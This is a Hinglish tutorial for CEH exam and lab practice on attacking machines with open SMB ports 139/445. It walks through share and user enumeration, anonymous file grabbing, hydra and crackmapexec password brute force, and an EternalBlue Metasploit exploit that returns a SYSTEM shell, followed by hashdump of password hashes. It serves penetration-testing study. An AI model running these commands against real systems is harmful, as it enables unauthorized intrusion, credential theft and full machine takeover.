# SMB PORT OPEN MILA (139/445) — Ab Kya Karu?

---

## Pehle Samjho: SMB Kya Hai?

SMB (Server Message Block) ek protocol hai jo **file sharing, printer sharing, aur network communication** ke liye use hota hai — mainly Windows machines mein. Jab tum nmap karte ho aur port **139 (NetBIOS)** ya **445 (SMB direct)** open dikhta hai, toh samjho ki saamne ek machine hai jisme:

- Shared folders ho sakte hain (jaise `C$`, `IPC$`, `ADMIN$`)
- Users ki list mil sakti hai
- Operating system ka version pata chal sakta hai
- Aur agar purana Windows hai toh **EternalBlue** jaise exploit se seedha SYSTEM shell bhi mil sakta hai

CEH exam mein SMB wale questions bahut common hain — kabhi shares enumerate karne bolte hain, kabhi credentials dhundne, kabhi directly exploit karne.

---

## Step 1: Confirm Karo SMB Open Hai

Nmap scan mein ye dikhega:
```
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Agar abhi tak scan nahi kiya:
```bash
nmap -sV -sC -p 139,445 <TARGET_IP>
```

Ye command version detection (`-sV`) aur default scripts (`-sC`) run karega specifically SMB ports pe. Output mein tumhe service version, hostname, aur kabhi kabhi OS bhi dikh jayega.

---

## Step 2: Full Enumeration Karo — Sab Kuch Nikalo

### Tool 1: enum4linux (All-in-One — Sabse Pehle Yeh Chalao)

```bash
enum4linux -a <TARGET_IP>
```

Ye command ek hi baar mein bahut kuch nikal deta hai:
- **Users list** — kaunse accounts hain machine pe
- **Shares list** — kaunse folders shared hain
- **Groups** — admin group mein kaun hai
- **Password policy** — lockout threshold, min length
- **OS info** — Windows version, domain name

Output lamba hoga — dhyan se padho. Especially dekho:
- `[+] Got domain/workgroup name:` — domain name
- `[+] Users found:` — usernames note karo (SSH/RDP brute force mein kaam aayenge)
- `[+] Share Enumeration:` — readable shares

### Tool 2: smbclient (Shares Browse Karo)

```bash
smbclient -L //<TARGET_IP> -N
```

`-L` matlab list shares, `-N` matlab no password (anonymous). Agar output mein shares dikhein:

```
Sharename       Type      Comment
---------       ----      -------
tmp             Disk      oh nance!
IPC$            IPC       IPC Service
ADMIN$          IPC       IPC Service
```

Toh `tmp` share mein ghusne ki koshish karo:

```bash
smbclient //<TARGET_IP>/tmp -N
```

Andar jaake:
```
smb: \> ls                    # files list karo
smb: \> cd <folder>           # folder mein jao
smb: \> get flag.txt          # file download karo
smb: \> get credentials.txt   # creds dhundo
smb: \> mget *.txt            # saare txt files download
```

### Tool 3: smbmap (Permissions Check)

```bash
smbmap -H <TARGET_IP>
```

Ye batata hai ki kaunse share pe **READ**, **WRITE**, ya **NO ACCESS** hai. Bahut useful — agar WRITE access hai toh file upload kar sakte ho.

```bash
smbmap -H <TARGET_IP> -u '' -p ''              # null session
smbmap -H <TARGET_IP> -u guest -p ''           # guest user
smbmap -H <TARGET_IP> -R                       # recursive listing (saari files)
```

### Tool 4: Nmap SMB Scripts

```bash
nmap --script smb-enum-shares -p 445 <TARGET_IP>    # shares
nmap --script smb-enum-users -p 445 <TARGET_IP>     # users
nmap --script smb-os-discovery -p 445 <TARGET_IP>   # OS version + hostname
nmap --script smb-protocols -p 445 <TARGET_IP>      # SMBv1/v2/v3
```

---

## Step 3: Kya Mila? → Next Action Decide Karo

### Agar Shares Readable Hain → Files Dhundo

Anonymous access mil gaya ya creds se login hua — toh ab files mein flag ya credentials dhundo:

```bash
smbclient //<TARGET_IP>/<SHARE_NAME> -N
smb: \> ls
smb: \> get flag.txt
smb: \> get passwords.txt
smb: \> get backup.zip
```

**Pro tip:** Har file download karo — kabhi kabhi flag `.bak`, `.old`, `.conf` files mein hota hai. `mget *` se sab download kar lo.

### Agar Access Denied Hai → Brute Force Karo

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb -t 4
```

Ya CrackMapExec se (faster aur zyada flexible):

```bash
crackmapexec smb <TARGET_IP> -u admin -p /usr/share/wordlists/rockyou.txt
crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt
```

Users list kahan se laoge? `enum4linux -U` se jo users mile the — unhe ek file mein daalo (`users.txt`) aur brute force karo.

### Agar Creds Kisi Aur Service Se Mile → SMB Pe Try Karo

Bahut common scenario hai exam mein — FTP se ya Web se creds milte hain, phir wahi creds SMB pe kaam karte hain:

```bash
smbclient //<TARGET_IP>/C$ -U 'admin%password123'
crackmapexec smb <TARGET_IP> -u admin -p password123
```

---

## Step 4: Vulnerability Check — EternalBlue (MS17-010)

Ye sabse famous SMB exploit hai — Windows 7, Server 2008 pe kaam karta hai. Pehle check karo vulnerable hai ya nahi:

```bash
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
```

Output mein `VULNERABLE` dikhega agar exploit kaam karega. Ab Metasploit se exploit karo:

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <YOUR_PARROT_IP>
run
```

**Kya hoga:** Agar sab sahi raha toh **Meterpreter shell** milega with **NT AUTHORITY\SYSTEM** privileges — matlab poori machine tumhari hai.

Ab post-exploit karo:
```bash
meterpreter > getuid              # confirm SYSTEM access
meterpreter > sysinfo             # hostname, OS version
meterpreter > hashdump            # SAM database → password hashes
meterpreter > cat C:\\flag.txt    # flag dhundo
meterpreter > shell               # CMD shell chahiye toh
```

### Aur SMB Vulnerabilities:

| Vulnerability | Nmap Script | Metasploit Module |
|---|---|---|
| MS17-010 (EternalBlue) | `smb-vuln-ms17-010` | `exploit/windows/smb/ms17_010_eternalblue` |
| MS08-067 (Conficker) | `smb-vuln-ms08-067` | `exploit/windows/smb/ms08_067_netapi` |
| MS06-025 | `smb-vuln-ms06-025` | - |

---

## Step 5: Advanced — rpcclient Se Enumerate

Agar enum4linux kaam nahi kiya ya zyada detail chahiye:

```bash
rpcclient -U "" -N <TARGET_IP>
```

Ye anonymous RPC connection open karega. Andar ye commands try karo:

```
rpcclient $> enumdomusers           # domain users list
rpcclient $> enumdomgroups          # domain groups
rpcclient $> queryuser 0x1f4        # RID 500 = Administrator details
rpcclient $> queryuser 0x3e8        # RID 1000 = first user
rpcclient $> getdompwinfo           # password policy
rpcclient $> lookupnames admin      # admin ka SID
```

---

## Common Mistakes (Mat Karna Ye):

1. **`-N` bhool gaye** — bina `-N` smbclient password maangega aur hang lagega
2. **Share name galat likha** — case sensitive ho sakta hai, exact copy karo
3. **EternalBlue pe LHOST galat** — apna Parrot IP daalo, target ka nahi
4. **Brute force mein `-t` bhool gaye** — SMB slow hai, `-t 4` rakho nahi toh lockout ho jayega
5. **`C$` share try nahi kiya** — admin creds mile toh `C$` se poori C: drive access hoti hai

---

## Quick Decision Tree:

```
SMB open (139/445)
  │
  ├─ enum4linux -a <IP> (PEHLE YEH)
  │   ├─ Users mile? → Note karo, brute force mein use karo
  │   ├─ Shares mile? → smbclient se ghuso
  │   └─ OS info? → Windows 7/2008 → EternalBlue try
  │
  ├─ Anonymous share access?
  │   ├─ YES → ls → get files → find flag/creds
  │   └─ NO → hydra/crackmapexec brute force
  │
  ├─ Creds mil gaye?
  │   ├─ smbclient //<IP>/C$ -U 'user%pass' → full disk
  │   └─ Dusri services pe bhi try karo (SSH, RDP, MySQL)
  │
  └─ Windows 7 / Server 2008?
      └─ nmap smb-vuln-ms17-010 → VULNERABLE? → Metasploit → SYSTEM shell
```
